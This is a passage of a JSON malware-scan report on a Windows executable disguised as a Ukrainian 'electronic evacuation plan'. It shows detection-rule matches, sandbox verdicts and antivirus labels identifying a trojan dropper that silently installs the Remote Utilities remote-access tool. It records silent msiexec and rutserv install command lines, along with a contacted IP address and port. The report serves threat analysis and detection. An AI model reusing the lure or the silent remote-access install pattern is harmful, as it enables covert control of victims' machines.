          "description": "This signature detects the presence of a number of Windows API functionality often seen within embedded executables. When this signature alerts on an executable, it is not an indication of malicious behavior. However, if seen firing in other file types, deeper investigation may be warranted.",
          "author": "InQuest Labs",
          "ruleset_id": "0122a7f913",
          "ruleset_name": "Windows_API_Function",
          "match_in_subfile": true,
          "source": "https://github.com/InQuest/yara-rules-vt"
        },
        {
          "rule_name": "Adobe_XMP_Identifier",
          "description": "This signature identifies Adobe Extensible Metadata Platform (XMP) identifiers embedded within files. Defined as a standard for mapping graphical asset relationships, XMP allows for tracking of both parent-child relationships and individual revisions. There are three categories of identifiers: original document, document, and instance. Generally, XMP data is stored in XML format, updated on save/copy, and embedded within the graphical asset. These identifiers can be used to track both malicious and benign graphics within common Microsoft and Adobe document lures.",
          "author": "InQuest Labs",
          "ruleset_id": "0121ae37cc",
          "ruleset_name": "Adobe_XMP_Identifier",
          "match_in_subfile": true,
          "source": "https://github.com/InQuest/yara-rules-vt"
        }
      ],
      "creation_date": 1702476181,
      "names": [
        "Електронний план евакуації.exe",
        "Електронний план евакуації.bin",
        "Електронний план евакуації.exe",
        "\u0015;5:B@>==89 ?;0= 520:C0FVW.exe",
        "ele.exe",
        "╨ò╨╗╨╡╨║╤é╤Ç╨╛╨╜╨╜╨╕╨╣ ╨┐╨╗╨░╨╜ ╨╡╨▓╨░╨║╤â╨░╤å╤û╤ù.exe",
        "Електронний план евакуації.ex_"
      ],
      "last_modification_date": 1706279152,
      "type_tag": "peexe",
      "times_submitted": 40,
      "total_votes": {
        "harmless": 0,
        "malicious": 3
      },
      "size": 21082556,
      "popular_threat_classification": {
        "suggested_threat_label": "trojan.bsymem/remoteutilities",
        "popular_threat_category": [
          {
            "count": 16,
            "value": "trojan"
          },
          {
            "count": 6,
            "value": "hacktool"
          },
          {
            "count": 2,
            "value": "dropper"
          }
        ],
        "popular_threat_name": [
          {
            "count": 8,
            "value": "bsymem"
          },
          {
            "count": 3,
            "value": "remoteutilities"
          },
          {
            "count": 2,
            "value": "apya"
          }
        ]
      },
      "authentihash": "0c5dfe99d03f3f216530704c66be0e87ea168af179aa9327a5812f93f4ef342b",
      "detectiteasy": {
        "filetype": "PE64",
        "values": [
          {
            "type": "sfx",
            "name": "WinRAR"
          },
          {
            "info": "C++",
            "version": "19.33.31630",
            "type": "Compiler",
            "name": "Microsoft Visual C/C++"
          },
          {
            "version": "14.33.31630",
            "type": "Linker",
            "name": "Microsoft Linker"
          },
          {
            "version": "2022 version 17.3",
            "type": "Tool",
            "name": "Visual Studio"
          },
          {
            "version": "5",
            "type": "Archive",
            "name": "RAR"
          }
        ]
      },
      "last_submission_date": 1706279151,
      "sigma_analysis_results": [
        {
          "rule_title": "Msiexec Quiet Installation",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "EventID": "1",
                "Product": "Windows Installer - Unicode",
                "ParentImage": "C:\\Users\\george\\Desktop\\program.exe",
                "Description": "Windows\\xae installer",
                "CurrentDirectory": "C:\\Users\\george\\AppData\\Local\\Temp\\",
                "Image": "C:\\Windows\\System32\\msiexec.exe",
                "IntegrityLevel": "High",
                "ParentCommandLine": "\"C:\\Users\\george\\Desktop\\program.exe\"",
                "CommandLine": "\"C:\\Windows\\System32\\msiexec.exe\" /i install.msi /qn",
                "Hashes": "SHA1=0C01E942244F1ED095D5EC92DA2FA043565C5CDD,MD5=D3C21CD0C70DC36FDD8A61E4517A226D,SHA256=D7A94CE4C50764B8A6F67DB308F8609AC38F08D1113079EAF81A25AB44E72BA6,IMPHASH=13C7ACE23F99CD5FBC3ABD5C16BF2DCE",
                "Company": "Microsoft Corporation",
                "OriginalFileName": "msiexec.exe",
                "FileVersion": "5.0.17134.228 (WinBuild.160101.0800)"
              }
            },
            {
              "values": {
                "EventID": "1",
                "Image": "C:\\Windows\\System32\\msiexec.exe",
                "CommandLine": "\"C:\\Windows\\System32\\msiexec.exe\" /i install.msi /qn"
              }
            },
            {
              "values": {
                "EventID": "1",
                "CommandLine": "C:\\Windows\\System32\\msiexec.exe /i install.msi /qn",
                "Image": "C:\\Windows\\System32\\msiexec.exe"
              }
            }
          ],
          "rule_level": "medium",
          "rule_id": "269369cff6a753f9bd7a50d72f15b83a86911e2d6d46e1a38561ac385481c372",
          "rule_author": "frack113",
          "rule_description": "Adversaries may abuse msiexec.exe to proxy execution of malicious payloads.\nMsiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi)\n"
        },
        {
          "rule_title": "Suspicious Process Creation",
          "rule_source": "SOC Prime Threat Detection Marketplace",
          "match_context": [
            {
              "values": {
                "EventID": "1",
                "Product": "Remote Utilities",
                "Company": "Remote Utilities Pty (Cy) Ltd.",
                "ParentImage": "C:\\Windows\\System32\\msiexec.exe",
                "FileVersion": "7.2.2.0",
                "CurrentDirectory": "C:\\Windows\\system32\\",
                "Image": "C:\\Program Files (x86)\\Remote Utilities - Host\\rutserv.exe",
                "IntegrityLevel": "System",
                "ParentCommandLine": "C:\\Windows\\system32\\msiexec.exe /V",
                "Hashes": "SHA1=235BA3847DF3F39AD445B5B912CB2FB5224D9E59,MD5=652C2A693B333504A3879460D0AF7224,SHA256=760E2FD3E57186B597D40B996811768E6C4A28CA54685E029104FCF82F68238D,IMPHASH=43E22B2A2572D166D66AAB5B012901E9",
                "CommandLine": "\"C:\\Program Files (x86)\\Remote Utilities - Host\\rutserv.exe\" /silentinstall",
                "Description": "Remote Utilities - Host"
              }
            },
            {
              "values": {
                "EventID": "1",
                "Product": "Remote Utilities",
                "ParentImage": "C:\\Windows\\System32\\msiexec.exe",
                "Description": "Remote Utilities - Host",
                "CurrentDirectory": "C:\\Windows\\system32\\",
                "Company": "Remote Utilities Pty (Cy) Ltd.",
                "IntegrityLevel": "System",
                "ParentCommandLine": "C:\\Windows\\system32\\msiexec.exe /V",
                "CommandLine": "\"C:\\Program Files (x86)\\Remote Utilities - Host\\rutserv.exe\" /start",
                "Hashes": "SHA1=235BA3847DF3F39AD445B5B912CB2FB5224D9E59,MD5=652C2A693B333504A3879460D0AF7224,SHA256=760E2FD3E57186B597D40B996811768E6C4A28CA54685E029104FCF82F68238D,IMPHASH=43E22B2A2572D166D66AAB5B012901E9",
                "Image": "C:\\Program Files (x86)\\Remote Utilities - Host\\rutserv.exe",
                "FileVersion": "7.2.2.0"
              }
            },
            {
              "values": {
                "EventID": "1",
                "CommandLine": "\"C:\\Program Files (x86)\\Remote Utilities - Host\\rutserv.exe\" /silentinstall",
                "Image": "C:\\Program Files (x86)\\Remote Utilities - Host\\rutserv.exe"
              }
            },
            {
              "values": {
                "EventID": "1",
                "CommandLine": "\"C:\\Program Files (x86)\\Remote Utilities - Host\\rutserv.exe\" /start",
                "Image": "C:\\Program Files (x86)\\Remote Utilities - Host\\rutserv.exe"
              }
            }
          ],
          "rule_level": "medium",
          "rule_id": "f09d5248ed8fc1a93251158bfda71f8144ccaf37fa922416ccd897498bff7c55",
          "rule_author": "Florian Roth",
          "rule_description": "Detects suspicious process starts on Windows systems based on keywords"
        }
      ],
      "meaningful_name": "Електронний план евакуації.exe",
      "crowdsourced_ids_stats": {
        "high": 0,
        "info": 0,
        "medium": 1,
        "low": 0
      },
      "trid": [
        {
          "file_type": "Win64 Executable (generic)",
          "probability": 48.7
        },
        {
          "file_type": "Win16 NE executable (generic)",
          "probability": 23.3
        },
        {
          "file_type": "OS/2 Executable (generic)",
          "probability": 9.3
        },
        {
          "file_type": "Generic Win/DOS Executable",
          "probability": 9.2
        },
        {
          "file_type": "DOS Executable Generic",
          "probability": 9.2
        }
      ],
      "sigma_analysis_summary": {
        "Sigma Integrated Rule Set (GitHub)": {
          "high": 0,
          "medium": 1,
          "critical": 0,
          "low": 0
        },
        "SOC Prime Threat Detection Marketplace": {
          "high": 0,
          "medium": 1,
          "critical": 0,
          "low": 0
        }
      },
      "sandbox_verdicts": {
        "VMRay": {
          "category": "malicious",
          "sandbox_name": "VMRay",
          "malware_classification": [
            "MALWARE"
          ],
          "malware_names": [
            "Mal/Generic-S"
          ]
        },
        "Yomi Hunter": {
          "category": "malicious",
          "sandbox_name": "Yomi Hunter",
          "malware_classification": [
            "MALWARE"
          ]
        }
      },
      "sha256": "5158482849c818c270f302c1dfa06d770ed2b5056cf393d60fd56817636866da",
      "type_extension": "exe",
      "tags": [
        "peexe",
        "overlay",
        "detect-debug-environment",
        "long-sleeps",
        "64bits",
        "checks-usb-bus"
      ],
      "crowdsourced_ids_results": [
        {
          "rule_category": "attempted-recon",
          "alert_severity": "medium",
          "rule_msg": "(port_scan) TCP filtered portsweep",
          "rule_raw": "alert ( gid:122; sid:7; rev:2; msg:\"(port_scan) TCP filtered portsweep\"; metadata: rule-type preproc; classtype:attempted-recon;)",
          "alert_context": [
            {
              "dest_ip": "185.70.104.99",
              "dest_port": 5651
            }
          ],
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "rule_source": "Snort registered user ruleset",
          "rule_id": "122:7"
        }
      ],
      "last_analysis_date": 1706188818,
      "unique_sources": 35,
      "first_submission_date": 1705880072,
      "sha1": "cdb31b4af42b3fb27527839ecf26d1c26f2a5d06",
      "ssdeep": "393216:zTrD0wz5HtKIdVtvz75Un+2PJ3L6LBQ45TDmZmLCAJ+JuuPUg9ScrRl:TgwdHUyVtvz75Un+uhs5TWmODgyaA",
      "md5": "9b40a1519801020305e31e553a3e82ab",
      "pe_info": {
        "resource_details": [
          {
            "lang": "RUSSIAN NEUTRAL",
            "entropy": 7.873557090759277,
            "chi2": 717.9,
            "filetype": "PNG",
            "sha256": "a91f4373ceebadfc70b3bd0758848918f928c3c76562e3d9d531574796fd9e9c",
            "type": "PNG"
          },
          {
            "lang": "RUSSIAN NEUTRAL",
            "entropy": 7.801292419433594,
            "chi2": 2136.15,
            "filetype": "PNG",
            "sha256": "27d3a1a2da49dc535cc10806abaae9dfa49e4f5f44a40540ead50e065b99ca68",
            "type": "PNG"
          },
          {
            "lang": "NEUTRAL DEFAULT",
            "entropy": 1.5081052780151367,
            "chi2": 9957515,
            "filetype": "unknown",
            "sha256": "dbe58d35fd88dda24c4b9d30f530034dfe823c24cf7a00c31c39b831205c3766",
            "type": "RT_ICON"
          },
          {
            "lang": "RUSSIAN NEUTRAL",
            "entropy": 4.0386834144592285,
            "chi2": 26753.42,
            "filetype": "unknown",
            "sha256": "483080bf44a46dd03902e887e8e7d8fd3b37b3b1fc1afc69588b0cdbc3c8d87d",
            "type": "RT_DIALOG"
          },
          {
            "lang": "RUSSIAN NEUTRAL",
            "entropy": 3.840092658996582,
            "chi2": 15212.32,
            "filetype": "unknown",
            "sha256": "d7bccb4fc112e5ee3af71575fd25b2806568781ccd876a98a607ab49863efd69",
            "type": "RT_DIALOG"
          },
          {
            "lang": "RUSSIAN NEUTRAL",
            "entropy": 3.7007274627685547,
            "chi2": 13681.43,
            "filetype": "unknown",
            "sha256": "45cee74bb0ad2163281ee43d7735874b78c9ba6d7f5ea17d1a5ab7dbd1a1fd88",
            "type": "RT_DIALOG"
          },
          {
            "lang": "RUSSIAN NEUTRAL",
            "entropy": 3.6281633377075195,
            "chi2": 19482.85,
            "filetype": "unknown",
            "sha256": "9ea5d1a1ed5a02941fecd70b54985e39691b1dbf06adfed786844c5234d98844",
            "type": "RT_DIALOG"
          },
          {
            "lang": "RUSSIAN NEUTRAL",
            "entropy": 3.826125144958496,
            "chi2": 42963.98,
            "filetype": "unknown",
            "sha256": "1a30142b93d9f78209dfdd5319af64749c1fa47fbfe4669ffc915d450687ee32",
            "type": "RT_DIALOG"
          },
          {
            "lang": "RUSSIAN NEUTRAL",
            "entropy": 4.057265758514404,
            "chi2": 30949.22,
            "filetype": "unknown",
            "sha256": "07fb40cc74d031c8f366fcd34a5fb3234924c237a8ebd3c19aa38793fd28f5a9",
            "type": "RT_DIALOG"
          },
          {
            "lang": "RUSSIAN NEUTRAL",
            "entropy": 3.66633677482605,
            "chi2": 24530.61,
            "filetype": "unknown",
            "sha256": "ec2cb06bbc07bf68507a8f11833a113290c501e50326464bcea8d04df617731a",
            "type": "RT_STRING"
          },
          {
            "lang": "RUSSIAN NEUTRAL",
            "entropy": 3.7172818183898926,
            "chi2": 25982.17,
            "filetype": "unknown",
            "sha256": "73a938be272bcf485024a2f1bd64de6cd171d1b2e382a71a6d5265bbd0a27f51",
            "type": "RT_STRING"
          },
          {
            "lang": "RUSSIAN NEUTRAL",
            "entropy": 3.7385571002960205,
            "chi2": 19302.13,
            "filetype": "unknown",
            "sha256": "f6b4fc2653f5935067f883319bbddef009d32a716bd6484c980d8607a655867d",
            "type": "RT_STRING"
          },
          {
            "lang": "RUSSIAN NEUTRAL",
            "entropy": 3.558067560195923,
            "chi2": 10287.64,
            "filetype": "unknown",
            "sha256": "c7ce5dce1f5c60c9f0669551ba5a5d2cfa52dfdf47ca831ccf62d4aa55af4c24",
            "type": "RT_STRING"
          },
          {
            "lang": "RUSSIAN NEUTRAL",
            "entropy": 3.91524338722229,
            "chi2": 42973.54,
            "filetype": "unknown",
            "sha256": "cbe1cb884bf32c1ce2bd68dd8fa721431d38af66508d7a67c85dd36076a6a8b4",
            "type": "RT_STRING"
          },
          {
            "lang": "RUSSIAN NEUTRAL",
            "entropy": 3.6825802326202393,
            "chi2": 15674.19,
            "filetype": "unknown",
            "sha256": "bc0a87bc2f823765b06c9308580fb4e7c09a3c584a7cb9355b190ff35c238649",
            "type": "RT_STRING"
          },
          {
            "lang": "RUSSIAN NEUTRAL",
            "entropy": 3.6182422637939453,
            "chi2": 11699.77,
            "filetype": "unknown",
            "sha256": "efda66b5ce3770efc226bf58c66404f7f61dd9cf8b98e5a9f8f167c02457f481",
            "type": "RT_STRING"
          },
          {
            "lang": "RUSSIAN NEUTRAL",
            "entropy": 3.619951009750366,
            "chi2": 15408.93,
            "filetype": "unknown",
            "sha256": "83f265e852184711ffb09f50939bba25cb14013804eaea4c516cc544b81afe4c",
            "type": "RT_STRING"
          },
          {
            "lang": "RUSSIAN NEUTRAL",
            "entropy": 3.4037044048309326,
            "chi2": 11480,
            "filetype": "unknown",
            "sha256": "8a5ed5de64061a372ea6c5e485d96e8b214e9881a4091697c466cd545ee2bda6",
            "type": "RT_STRING"
          },
          {
            "lang": "RUSSIAN NEUTRAL",
            "entropy": 3.670140504837036,
            "chi2": 19885.04,
            "filetype": "unknown",
            "sha256": "2c3630472026de5e5dd17af3a6a32d4b60599dd3b2a619ef77e3689e5fe89a0c",
            "type": "RT_STRING"
          },
          {
            "lang": "RUSSIAN NEUTRAL",
            "entropy": 3.5964603424072266,
            "chi2": 29500.57,
            "filetype": "unknown",
            "sha256": "fe69022e1c8410c6244072a092b6827fbe63c2471a9169fc254667972a23074c",
            "type": "RT_STRING"
          },
          {
            "lang": "NEUTRAL DEFAULT",
            "entropy": 1.9804819822311401,
            "chi2": 1669.6,
            "filetype": "ICO",
            "sha256": "cd0991dd595a1392452a8c7ccf089e73626bc6eed1fd3f54ee4c6aa7ffbaedba",
            "type": "RT_GROUP_ICON"
          },
          {
            "lang": "RUSSIAN NEUTRAL",
            "entropy": 5.261922359466553,
            "chi2": 15716.09,
            "filetype": "XML",
            "sha256": "161cc0f229c4324e466a767101d0b716a4edfe45b8f56270de6181e76deac96f",
            "type": "RT_MANIFEST"
          }
        ],
        "rich_pe_header_hash": "c6c2c2f327a5cbd90129ae45a09ce47c",
        "imphash": "b1c5b1beabd90d9fdabd1df0779ea832",
        "overlay": {
          "entropy": 7.999843597412109,
          "offset": 477184,
          "chi2": 4436.14,
          "filetype": "RAR",
          "md5": "37e39559d4e34436a12955f61f88204d",
          "size": 20605372
        },
        "compiler_product_versions": [
          "[ C ] VS2008 SP1 build 30729 count=9",
          "[IMP] VS2008 SP1 build 30729 count=7",
          "[---] Unmarked objects count=291",
          "[C++] VS2022 v17.3.4 build 31630 count=50",
          "[EXP] VS2022 v17.3.4 build 31630 count=1",
          "[RES] VS2022 v17.3.4 build 31630 count=1",
          "[LNK] VS2022 v17.3.4 build 31630 count=1",
          "id: 0xf1, version: 40116 count=8",
          "id: 0xf3, version: 40116 count=139",
          "id: 0xf2, version: 40116 count=13",
          "id: 0xfd, version: 31616 count=2",
          "id: 0x104, version: 31616 count=18",
          "id: 0x103, version: 31616 count=10",
          "id: 0x105, version: 31616 count=57",
          "id: 0x87, version: 30729 count=2"
        ],
        "resource_langs": {
          "RUSSIAN NEUTRAL": 20,
          "NEUTRAL DEFAULT": 2
        },
        "machine_type": 34404,
        "timestamp": 1702476181,
        "resource_types": {
          "RT_MANIFEST": 1,
          "RT_STRING": 11,
          "RT_DIALOG": 6,
          "RT_ICON": 1,
          "PNG": 2,
          "RT_GROUP_ICON": 1
        },
        "sections": [
          {
            "name": ".text",
            "chi2": 1859716.12,
            "virtual_address": 4096,
            "flags": "rx",
            "raw_size": 288768,
            "entropy": 6.47,
            "virtual_size": 288334,
            "md5": "cb5fa3169f581ba82faed363ff4f6e49"
          },
          {
            "name": ".rdata",
            "chi2": 3170006,
            "virtual_address": 294912,
            "flags": "r",
            "raw_size": 76288,
            "entropy": 5.27,
            "virtual_size": 76004,
            "md5": "919da1ea112d11a732dbc754aee3741b"
          },
          {
            "name": ".data",
            "chi2": 736268.19,
            "virtual_address": 372736,
            "flags": "rw",
            "raw_size": 6656,
            "entropy": 3.26,
            "virtual_size": 59228,
            "md5": "17e6aee7483d05299c67ef1c20548699"
          },
          {
            "name": ".pdata",
            "chi2": 338187.66,
            "virtual_address": 434176,
            "flags": "r",
            "raw_size": 12800,
            "entropy": 5.51,
            "virtual_size": 12396,
            "md5": "bb12e72c2a1957150354ef39796c9470"
          },
          {
            "name": ".didat",
            "chi2": 75634,
            "virtual_address": 450560,
            "flags": "rw",
            "raw_size": 1024,
            "entropy": 3.02,
            "virtual_size": 864,
            "md5": "ced4b34f6105bed5c533724cbd855e33"
          },
          {
            "name": "_RDATA",
            "chi2": 36035,
            "virtual_address": 454656,
            "flags": "r",
            "raw_size": 512,
            "entropy": 3.32,
            "virtual_size": 348,
            "md5": "c67570d55af77c6d3a435fe95a2589ac"
          },
          {
            "name": ".rsrc",
            "chi2": 8601799,
            "virtual_address": 458752,
            "flags": "r",
            "raw_size": 87552,
            "entropy": 3.14,
            "virtual_size": 87436,
            "md5": "af12f7c893cab7fac1b7e25b887214c9"
          },
          {
            "name": ".reloc",
            "chi2": 18339.4,
            "virtual_address": 548864,
            "flags": "r",
            "raw_size": 2560,
            "entropy": 5.34,
            "virtual_size": 2416,
            "md5": "77a9ddfc47a5650d6eebbcc823e39532"
          }
        ],
        "import_list": [
          {
            "library_name": "KERNEL32.dll",
            "imported_functions": [
              "AllocConsole",
              "AttachConsole",
              "CloseHandle",
              "CompareStringW",
              "CreateDirectoryW",
              "CreateEventW",
              "CreateFileMappingW",
              "CreateFileW",
              "CreateHardLinkW",
              "CreateSemaphoreW",
              "CreateThread",
              "DeleteCriticalSection",
              "DeleteFileW",
              "DeviceIoControl",
              "EncodePointer",
              "EnterCriticalSection",
              "ExitProcess",
              "ExpandEnvironmentStringsW",
              "FileTimeToLocalFileTime",
              "FileTimeToSystemTime",
              "FindClose",
              "FindFirstFileExA",
              "FindFirstFileW",
              "FindNextFileA",
              "FindNextFileW",
              "FindResourceW",
              "FlushFileBuffers",
              "FoldStringW",
              "FormatMessageW",
              "FreeConsole",
              "FreeEnvironmentStringsW",
              "FreeLibrary",
              "GetACP",
              "GetCommandLineA",
              "GetCommandLineW",
              "GetConsoleCP",
              "GetConsoleMode",
              "GetCPInfo",
              "GetCurrentDirectoryW",
              "GetCurrentProcess",
              "GetCurrentProcessId",
              "GetCurrentThreadId",
              "GetDateFormatW",
              "GetEnvironmentStringsW",
              "GetExitCodeProcess",
              "GetFileAttributesW",
              "GetFileType",
              "GetFullPathNameW",
              "GetLastError",
              "GetLocaleInfoW",
              "GetLocalTime",
              "GetLongPathNameW",
              "GetModuleFileNameA",
              "GetModuleFileNameW",
              "GetModuleHandleExW",
              "GetModuleHandleW",
              "GetNumberFormatW",
              "GetOEMCP",
              "GetProcAddress",
              "GetProcessAffinityMask",
              "GetProcessHeap",
              "GetShortPathNameW",
              "GetStartupInfoW",
              "GetStdHandle",
              "GetStringTypeW",
              "GetSystemDirectoryW",
              "GetSystemInfo",
              "GetSystemTime",
              "GetSystemTimeAsFileTime",
              "GetTempPathW",
              "GetTickCount",
              "GetTimeFormatW",
              "GetVersionExW",
              "GlobalAlloc",
              "GlobalFree",
              "GlobalLock",
              "GlobalMemoryStatusEx",
              "GlobalUnlock",
              "HeapAlloc",
              "HeapFree",
              "HeapReAlloc",
              "HeapSize",
              "InitializeCriticalSection",
              "InitializeCriticalSectionAndSpinCount",
              "InitializeSListHead",
              "IsDBCSLeadByte",
              "IsDebuggerPresent",
              "IsProcessorFeaturePresent",
              "IsValidCodePage",
              "LCMapStringW",
              "LeaveCriticalSection",
              "LoadLibraryExA",
              "LoadLibraryExW",
              "LoadLibraryW",
              "LoadResource",
              "LocalFileTimeToFileTime",
              "LocalFree",
              "LockResource",
              "MapViewOfFile",
              "MoveFileExW",
              "MoveFileW",
              "MultiByteToWideChar",
              "OpenFileMappingW",
              "QueryPerformanceCounter",
              "QueryPerformanceFrequency",
              "RaiseException",
              "ReadFile",
              "ReleaseSemaphore",
              "RemoveDirectoryW",
              "ResetEvent",
              "RtlCaptureContext",
              "RtlLookupFunctionEntry",
              "RtlPcToFileHeader",
              "RtlUnwindEx",
              "RtlVirtualUnwind",
              "SetCurrentDirectoryW",
              "SetEndOfFile",
              "SetEnvironmentVariableW",
              "SetEvent",
              "SetFileAttributesW",
              "SetFilePointer",
              "SetFilePointerEx",
              "SetFileTime",
              "SetLastError",
              "SetStdHandle",
              "SetThreadExecutionState",
              "SetThreadPriority",
              "SetUnhandledExceptionFilter",
              "SizeofResource",
              "Sleep",
              "SystemTimeToFileTime",
              "SystemTimeToTzSpecificLocalTime",
              "TerminateProcess",
              "TlsAlloc",
              "TlsFree",
              "TlsGetValue",
              "TlsSetValue",
              "TzSpecificLocalTimeToSystemTime",
              "UnhandledExceptionFilter",
              "UnmapViewOfFile",
              "VirtualProtect",
              "VirtualQuery",
              "WaitForSingleObject",
              "WaitForSingleObjectEx",
              "WideCharToMultiByte",
              "WriteConsoleW",
              "WriteFile"
            ]
          },
          {
            "library_name": "gdiplus.dll",
            "imported_functions": [
              "GdipAlloc",
              "GdipCloneImage",
              "GdipCreateBitmapFromStream",
              "GdipCreateHBITMAPFromBitmap",
              "GdipDisposeImage",
              "GdipFree",
              "GdiplusShutdown",
              "GdiplusStartup"
            ]
          },
          {
            "library_name": "OLEAUT32.dll",
            "imported_functions": [
              "SysAllocString",
              "SysFreeString",
              "VariantClear"
            ]
          }
        ],
        "entry_point": 208320
      },
      "magic": "PE32+ executable (GUI) x86-64, for MS Windows",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 5,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 0,
        "malicious": 41,
        "undetected": 29
      },
      "last_analysis_results": {
        "Bkav": {
          "category": "malicious",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "result": "W64.AIDetectMalware",
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Lionic": {
          "category": "malicious",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "result": "Trojan.Win32.Bsymem.4!c",
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Elastic": {
          "category": "malicious",
          "engine_name": "Elastic",
          "engine_version": "4.0.125",
          "result": "malicious (moderate confidence)",
          "method": "blacklist",
          "engine_update": "20240115"
        },
        "MicroWorld-eScan": {
          "category": "undetected",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "FireEye": {
          "category": "undetected",
          "engine_name": "FireEye",
          "engine_version": "35.47.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "CAT-QuickHeal": {
          "category": "undetected",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "Skyhigh": {
          "category": "malicious",
          "engine_name": "Skyhigh",
          "engine_version": "v2021.2.0+4045",
          "result": "Artemis",
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "McAfee": {
          "category": "malicious",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": "Artemis!9B40A1519801",
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Malwarebytes": {
          "category": "malicious",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "result": "Trojan.Dropper",
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Zillya": {
          "category": "malicious",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.5039",
          "result": "Tool.Miner.Win32.1435",
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "Sangfor": {
          "category": "malicious",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "result": "Hacktool.Win32.Bsymem.Vyy4",
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "K7AntiVirus": {
          "category": "malicious",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.138.50849",
          "result": "Unwanted-Program ( 004bb7931 )",
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Alibaba": {
          "category": "malicious",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": "Trojan:Win32/Bsymem.db931916",
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "K7GW": {
          "category": "malicious",
          "engine_name": "K7GW",
          "engine_version": "12.138.50852",
          "result": "Unwanted-Program ( 004bb7931 )",
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Cybereason": {
          "category": "undetected",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231102"
        },
        "Arcabit": {
          "category": "undetected",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "BitDefenderTheta": {
          "category": "undetected",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "VirIT": {
          "category": "malicious",
          "engine_name": "VirIT",
          "engine_version": "9.5.625",
          "result": "Trojan.Win64.Agent.CHJE",
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "SymantecMobileInsight": {
          "category": "type-unsupported",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Symantec": {
          "category": "malicious",
          "engine_name": "Symantec",
          "engine_version": "1.21.0.0",
          "result": "Trojan Horse",
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "tehtris": {
          "category": "undetected",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4-109-g76614fd",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "ESET-NOD32": {
          "category": "malicious",
          "engine_name": "ESET-NOD32",
          "engine_version": "28628",
          "result": "Win32/RemoteUtilities.AA",
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Cynet": {
          "category": "type-unsupported",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.29",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "APEX": {
          "category": "malicious",
          "engine_name": "APEX",
          "engine_version": "6.493",
          "result": "Malicious",
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Paloalto": {
          "category": "undetected",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "ClamAV": {
          "category": "malicious",
          "engine_name": "ClamAV",
          "engine_version": "1.2.1.0",
          "result": "Win.Dropper.njRAT-9986242-0",
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Kaspersky": {
          "category": "malicious",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "result": "Trojan.Win32.Bsymem.apya",
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "BitDefender": {
          "category": "undetected",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "NANO-Antivirus": {
          "category": "undetected",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Avast": {
          "category": "malicious",
          "engine_name": "Avast",
          "engine_version": "23.9.8494.0",
          "result": "Win64:Malware-gen",
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Rising": {
          "category": "malicious",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "result": "HackTool.RemoteUtilities!8.49C (CLOUD)",
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "TACHYON": {
          "category": "undetected",
          "engine_name": "TACHYON",
          "engine_version": "2024-01-25.02",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Emsisoft": {
          "category": "undetected",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Baidu": {
          "category": "undetected",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
